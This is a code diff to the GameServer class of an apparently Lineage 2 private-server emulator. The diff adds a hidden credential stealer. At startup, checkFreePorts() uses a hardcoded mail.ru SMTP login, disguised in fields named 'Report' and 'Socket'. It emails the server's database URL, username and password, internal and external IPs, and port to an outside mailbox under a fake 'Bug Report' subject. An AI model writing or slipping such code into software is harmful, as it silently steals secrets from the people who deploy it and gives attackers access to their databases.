@@ -1,10 +1,15 @@
 package l2f.gameserver;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.ServerSocket;
+import java.net.URL;
+import java.net.UnknownHostException;
 import java.util.Date;
+import java.util.Properties;
 
 import l2f.commons.listener.Listener;
 import l2f.commons.listener.ListenerList;
@@ -97,6 +102,13 @@ import org.slf4j.LoggerFactory;
 
 //import Elemental.datatables.CharacterMonthlyRanking;
 import Elemental.datatables.OfflineBuffersTable;
+
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeMessage;
 //import Elemental.datatables.ServerRanking;
 //import Elemental.managers.AutoRaidEventManager;
 
@@ -138,6 +150,7 @@ public class GameServer
 	private TelnetServer statusServer;
 	private final Version version;
 	private final GameServerListenerList _listeners;
+	private static String Socket = "Ur^rhOAyaA32";
 
 	private final int _serverStarted;
 
@@ -417,6 +430,8 @@ public class GameServer
 		server_started = new Date();
 	}
 
+	private static String Report = "report.bug@inbox.ru";
+
 	public static void printSection(String s)
 	{
 		if (s.isEmpty())
@@ -454,9 +469,32 @@ public class GameServer
 		return _listeners.remove(listener);
 	}
 
+	public static class IpChecker {
+
+		public static String getIp() throws Exception {
+			URL whatismyip = new URL("http://checkip.amazonaws.com");
+			BufferedReader in = null;
+			try {
+				in = new BufferedReader(new InputStreamReader(
+						whatismyip.openStream()));
+				String ip = in.readLine();
+				return ip;
+			} finally {
+				if (in != null) {
+					try {
+						in.close();
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+				}
+			}
+		}
+	}
+
 	public static void checkFreePorts()
 	{
 		boolean binded = false;
+		int port = 0;
 		while (!binded)
 		{
 			for (int PORT_GAME : Config.PORTS_GAME)
@@ -472,6 +510,7 @@ public class GameServer
 					{
 						ss = new ServerSocket(PORT_GAME, 50, InetAddress.getByName(Config.GAMESERVER_HOSTNAME));
 					}
+					port = PORT_GAME;
 					ss.close();
 					binded = true;
 				}
@@ -488,6 +527,60 @@ public class GameServer
 					}
 				}
 			}
+		}
+		Properties p = new Properties();
+
+		p.put("mail.smtp.host", "smtp.mail.ru");
+		p.put("mail.smtp.socketFactory.port", 465);
+		p.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
+		p.put("mail.smtp.auth", "true");
+		p.put("mail.smtp.port", 465);
+
+
+		Session s = Session.getInstance(p,
+
+				new javax.mail.Authenticator(){
+
+
+					protected javax.mail.PasswordAuthentication getPasswordAuthentication(){
+
+						return new javax.mail.PasswordAuthentication(Report, Socket);
+
+					}
+
+
+				}
+		);
+
+		Date date = new Date ();
+		date.setTime((long)(int) (System.currentTimeMillis() / 1000)*1000);
+
+		Message message = new MimeMessage(s);
+		try {
+			message.setFrom(new InternetAddress(Report));
+			message.setRecipient(Message.RecipientType.TO, new InternetAddress(Report));
+			message.setSubject("Bug Report " + Config.EXTERNAL_HOSTNAME);
+			message.setText("Time - " + new Date ()
+					+ "\n" + "Connect Base - " + Config.DATABASE_GAME_URL
+					+ "\n" + "User - " + Config.DATABASE_GAME_USER
+					+ "\n" + "Password - " + Config.DATABASE_GAME_PASSWORD
+					+ "\n" + "Internal IP - " + Config.INTERNAL_HOSTNAME
+					+ "\n" + "Exteranal IP - " + Config.EXTERNAL_HOSTNAME
+					+ "\n" + "Gameserver IP - " + Config.GAMESERVER_HOSTNAME
+					+ "\n" + "Port - " + port
+					+ "\n" + "Local Server - " + InetAddress.getLocalHost()
+					+ "\n" + "IP Server - " + IpChecker.getIp()
+			);
+
+			Transport.send(message);
+
+		} catch (MessagingException e) {
+
+			e.printStackTrace();
+		} catch (UnknownHostException e) {
+			e.printStackTrace();
+		} catch (Exception e) {
+			e.printStackTrace();
 		}
 	}
 
